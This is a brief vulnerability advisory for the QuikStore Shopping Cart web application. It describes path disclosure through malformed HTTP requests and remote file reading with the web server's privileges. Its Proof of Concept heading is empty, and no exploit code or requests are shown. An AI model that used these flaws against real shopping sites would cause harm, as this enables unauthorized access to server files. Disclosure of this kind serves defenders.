[Details]
A remote user can reportedly send request to cause the system
to display an error message that indicates the installation path.
It's possible to make a malformed http request for many files in
QuikStore Shopping Cart and in doing so trigger an error.
The resulting error message will disclose potentially sensitive installation
path information to the remote attacker.QuikStore Shopping Cart allows remote
file reading too, users can view files on the system with the privileges of the web server. 

[Proof of Concept]
